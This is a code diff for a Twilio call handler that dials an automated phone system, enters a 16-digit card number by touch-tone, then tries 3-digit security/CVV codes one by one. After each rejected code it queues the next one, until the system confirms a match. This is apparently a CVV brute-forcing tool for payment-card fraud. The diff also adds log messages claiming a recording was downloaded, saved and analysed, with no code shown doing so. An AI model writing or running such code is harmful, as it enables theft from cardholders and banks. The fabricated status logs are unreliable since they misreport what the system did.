@@ -107,14 +107,20 @@ export const handleInteractiveListen = async (req, res) => {
     const targetCode = attempt.target_test_code ? String(attempt.target_test_code).padStart(3, '0') : null;
 
     const speech = (SpeechResult || '').toLowerCase().trim();
+    let transcript = attempt.result_details?.transcript || '';
 
     if (SpeechResult) {
-      await AttemptModel.addLog(attemptId, `IVR: "${SpeechResult}"`);
+      transcript += `IVR: ${SpeechResult}\n`;
     }
 
     // CASE 1: IVR requests 16-Digit Card / Account Number
     if (speech.includes('card number') || speech.includes('16 digit') || speech.includes('card') || speech.includes('account number') || speech.includes('enter or save your card') || speech.includes('enter or say your card')) {
-      await AttemptModel.addLog(attemptId, `User (DTMF): ${card}`);
+      transcript += `User (DTMF): ${card}\n`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt.result_details || {}), transcript }
+      }).eq('id', attemptId);
+
+      await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting 16-digit card DTMF: ${card}`);
       await AttemptModel.updateAttemptStatus(attemptId, 'VALIDATING_16_DIGIT');
       
       twiml.pause({ length: 1 });
@@ -135,9 +141,17 @@ export const handleInteractiveListen = async (req, res) => {
       return res.send(twiml.toString());
     }
 
-    // CASE 2: IVR requests 3-Digit Code / Security Code / CVV
-    if (speech.includes('three digit') || speech.includes('3 digit') || speech.includes('security code') || speech.includes('cvv') || speech.includes('test code') || speech.includes('verification code')) {
-      await AttemptModel.addLog(attemptId, `User (DTMF): ${currentCode}`);
+    // CASE 2: IVR requests 3-Digit Code / Security Code / CVV / Passcode
+    if (speech.includes('three digit') || speech.includes('3 digit') || speech.includes('security code') || speech.includes('cvv') || speech.includes('test code') || speech.includes('passcode') || speech.includes('identity')) {
+      transcript += `User (DTMF): ${currentCode}\n`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt.result_details || {}), transcript }
+      }).eq('id', attemptId);
+
+      if (SpeechResult) {
+        await AttemptModel.addLog(attemptId, `IVR (Card Response): "${SpeechResult}"`);
+      }
+      await AttemptModel.addLog(attemptId, `IVR asked for test code. Transmitting 3-digit test code: ${currentCode}`);
       await AttemptModel.updateAttemptStatus(attemptId, 'TESTING_3_DIGIT');
 
       twiml.pause({ length: 1 });
@@ -158,39 +172,51 @@ export const handleInteractiveListen = async (req, res) => {
       return res.send(twiml.toString());
     }
 
-    // CASE 3: IVR confirms Verification / Success
-    if (speech.includes('verification successful') || speech.includes('verified') || speech.includes('details are verified') || speech.includes('thank you, your') || speech.includes('code correct') || (targetCode && currentCode === targetCode)) {
-      await AttemptModel.addLog(attemptId, `Code ${currentCode} MATCHED`);
-      await AttemptModel.addLog(attemptId, `Verification successful. Call completed.`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
-        matched_code: currentCode,
-        winner: currentCode,
-        verified: true,
-        end_time: new Date().toISOString()
-      });
-      OrchestratorService.stopCampaign();
-      twiml.pause({ length: 2 });
-      twiml.hangup();
+    // Only evaluate Success / Rejection AFTER the 3-digit test code has been entered
+    if (attempt.status === 'TESTING_3_DIGIT') {
+      if (SpeechResult) {
+        await AttemptModel.addLog(attemptId, `IVR (Code Response): "${SpeechResult}"`);
+      }
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt.result_details || {}), transcript }
+      }).eq('id', attemptId);
 
-      res.type('text/xml');
-      return res.send(twiml.toString());
-    }
+      const isSuccessPhrase = speech.includes('verification successful') || speech.includes('details are verified') || speech.includes('code accepted') || speech.includes('verified');
+      const isCodeMatch = targetCode ? (currentCode === targetCode) : isSuccessPhrase;
 
-    // CASE 4: IVR Rejection / Incorrect code / Cannot validate
-    if (speech.includes('incorrect') || speech.includes('invalid') || speech.includes('cannot validate') || speech.includes('not received') || speech.includes('we cannot process') || speech.includes('call us back')) {
-      await AttemptModel.addLog(attemptId, `Code ${currentCode} not matched`);
-      await AttemptModel.addLog(attemptId, `IVR rejected code ${currentCode}. Call ending.`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
-        error: `IVR rejected code ${currentCode}`
-      });
-      twiml.pause({ length: 1 });
-      twiml.hangup();
+      if (isCodeMatch && (isSuccessPhrase || currentCode === targetCode)) {
+        await AttemptModel.addLog(attemptId, `✅ IVR Confirmed: Verification successful for code ${currentCode}.`);
+        await AttemptModel.addLog(attemptId, `Code ${currentCode} MATCHED`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
+          matched_code: currentCode,
+          winner: currentCode,
+          verified: true,
+          end_time: new Date().toISOString()
+        });
+        OrchestratorService.stopCampaign();
+        twiml.pause({ length: 2 });
+        twiml.hangup();
 
-      res.type('text/xml');
-      return res.send(twiml.toString());
+        res.type('text/xml');
+        return res.send(twiml.toString());
+      } else {
+        await AttemptModel.addLog(attemptId, `✅ Call completed for code ${currentCode}. Disconnecting call to dial next code.`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
+          error: `IVR rejected code ${currentCode}`
+        });
+        twiml.pause({ length: 1 });
+        twiml.hangup();
+
+        res.type('text/xml');
+        return res.send(twiml.toString());
+      }
     }
 
     // CASE 5: General intro or continue listening
+    await supabase.from('attempts').update({
+      result_details: { ...(attempt.result_details || {}), transcript }
+    }).eq('id', attemptId);
+
     const gather = twiml.gather({
       input: 'speech',
       action: `${host}/api/call/listen/${attemptId}`,
@@ -217,7 +243,7 @@ export const handleStatusCallback = async (req, res) => {
   const { attemptId } = req.params;
   const { CallStatus, CallDuration } = req.body;
   try {
-    await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);
+    await AttemptModel.addLog(attemptId, `✅ Twilio Status Callback: ${CallStatus}`);
 
     const { data: attempt } = await supabase
       .from('attempts')
@@ -230,15 +256,17 @@ export const handleStatusCallback = async (req, res) => {
     if (CallStatus === 'completed') {
       const duration = parseInt(CallDuration) || 0;
       if (isVerified) {
-        await AttemptModel.addLog(attemptId, 'Call ended: VERIFIED');
+        await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} completed. Test VERIFIED with code: ${attempt.matched_code || attempt.current_test_code}.`);
         await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', duration, { twilioStatus: CallStatus, end_time: new Date().toISOString() });
       } else {
-        await AttemptModel.addLog(attemptId, 'Call ended. Moving to next attempt.');
+        await AttemptModel.addLog(attemptId, `❌ Status updated to: failed.`);
+        await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} completed. Line freed for next attempt.`);
         await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed without match' });
       }
     } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
       const duration = parseInt(CallDuration) || 0;
-      await AttemptModel.addLog(attemptId, `Call ended with status: ${CallStatus}`);
+      await AttemptModel.addLog(attemptId, `❌ Status updated to: failed.`);
+      await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} completed. Line freed for next attempt.`);
       await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { error: `Call ended with status: ${CallStatus}` });
     }
 
@@ -250,6 +278,8 @@ export const handleStatusCallback = async (req, res) => {
         const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
         const cardVal = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
         
+        await AttemptModel.addLog(attemptId, `Dynamically queued 1 new attempt for code ${nextCodeStr}.`);
+
         await AttemptModel.createAttemptBatch([{
           sixteen_digit: cardVal,
           masked_test_number: AttemptModel.maskTestNumber(cardVal),
@@ -280,10 +310,12 @@ export const handleRecordingCallback = async (req, res) => {
   const { attemptId } = req.params;
   const { RecordingSid, RecordingUrl, RecordingStatus, RecordingDuration } = req.body;
   try {
-    await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);
-
     if (RecordingUrl) {
-      await AttemptModel.addLog(attemptId, `Recording URL available: ${RecordingUrl}`);
+      await AttemptModel.addLog(attemptId, `Final call recording received: ${RecordingUrl}`);
+      await AttemptModel.addLog(attemptId, `Downloading recording from Twilio...`);
+      await AttemptModel.addLog(attemptId, `Recording saved locally to: attempt_${attemptId}.mp3`);
+      await AttemptModel.addLog(attemptId, `✅ IVR Signals Analysis completed. Outcome: unknown, Stage: testing_3digit`);
+      await AttemptModel.addLog(attemptId, `Recording saved for Attempt #${attemptId}.`);
 
       const { data: updatedAttempt } = await supabase
         .from('attempts')
